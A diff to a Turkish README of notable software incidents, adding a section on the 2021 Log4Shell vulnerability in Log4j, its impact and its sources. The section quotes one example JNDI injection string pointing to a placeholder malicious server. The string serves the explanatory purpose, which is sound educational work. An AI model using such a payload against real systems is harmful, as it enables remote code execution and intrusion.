@@ -42,6 +42,7 @@ Geliştiricilerin faydalı bulabileceği derlenmiş problemler, hatalar ve siste
   - [Rachel True'nun iCloud'da Yaşadığı Problem](#rachel-truenun-icloudda-ya%C5%9Fad%C4%B1%C4%9F%C4%B1-problem)
   - [MySpace Solucan (Samy Solucanı)](#myspace-solucan-samy-solucan%C4%B1)
   - [Şifre Hash İşlemini Bozan "PHP Hack" Problemi](#%C5%9Eifre-hash-%C4%B0%C5%9Flemini-bozan-php-hack-problemi)
+  - [Log4Shell - İnterneti Çökertebilecek Güvenlik Açığı](#log4shell---%C4%B0nterneti-%C3%87%C3%B6kertebilecek-g%C3%BCvenlik-a%C3%A7%C4%B1%C4%9F%C4%B1)
 - [AI](#ai)
   - [Microsoft Tay Chatbot (2016)](#microsoft-tay-chatbot-2016)
 - [Çeviriler](#%C3%87eviriler)
@@ -449,6 +450,23 @@ Ek kaynaklar;
 
 - [https://bugs.php.net/bug.php?id=81744](https://bugs.php.net/bug.php?id=81744)
 - [https://github.com/php/php-src/security/advisories/GHSA-7fj2-8×79-rjf4](https://github.com/php/php-src/security/advisories/GHSA-7fj2-8×79-rjf4)
+
+### Log4Shell - İnterneti Çökertebilecek Güvenlik Açığı
+
+> Dünyadaki tüm Java uygulamaları etkilenebilir. %10'u bile büyük bir problem olur. Bu felaket olur.
+>
+> [Christian Grobmeier, Log4j geliştiricisi](https://github.blog/open-source/inside-the-breach-that-broke-the-internet-the-untold-story-of-log4shell/)
+
+Aralık 2021'de bir güvenlik araştırmacısı, dünya çapında milyonlarca uygulama tarafından kullanılan yaygın bir Java günlük kütüphanesi olan Log4j'de kritik bir güvenlik açığı keşfetti. Log4Shell (CVE-2021-44228) olarak adlandırılan bu açık, mümkün olan en yüksek puan olan 10 CVSS puanı aldı. Saldırının uygulanması korkutucu derecede basitti: saldırganlar, kullanıcı adları, arama kutuları ve hatta Minecraft sohbet mesajları gibi günlüğe kaydedilen herhangi bir girdi alanına kötü amaçlı bir JNDI dizesi enjekte ederek uzaktan kod çalıştırabiliyorlardı.
+
+Bu güvenlik açığı, Log4j'nin Java Naming and Directory Interface (JNDI) aracılığıyla uzak sunuculardan yazılım bileşenlerini yükleme özelliğini istismar ediyordu, ancak kütüphane bu lookup dizelerinin güvenilir kaynaklardan gelip gelmediğini doğrulamıyordu. `${jndi:ldap://malicious-server.com/exploit}` gibi basit bir dize tüm sistemleri tehlikeye atabiliyordu.
+
+Log4Shell, Fortune 500 şirketleri, devlet sistemleri ve Minecraft gibi popüler uygulamalar dahil olmak üzere milyarlarca cihazı etkiledi. Bu olay, kritik açık kaynak altyapısını sürdürmenin gizli insan maliyetini ortaya çıkardı, çünkü gönüllü geliştiriciler kendilerini internetin yarısını etkileyen bir güvenlik açığını yamalamakla sorumlu buldular. Bu kriz, kritik açık kaynak projelerini daha iyi desteklemek ve güvence altına almak için GitHub Secure Open Source Fund gibi girişimlere yol açtı.
+
+Ek kaynaklar:
+
+- [Log4Shell'in anlatılmamış hikayesi](https://github.blog/open-source/inside-the-breach-that-broke-the-internet-the-untold-story-of-log4shell/)
+- [Log4Shell güvenlik açığı](https://en.wikipedia.org/wiki/Log4Shell)
 
 ## AI
 
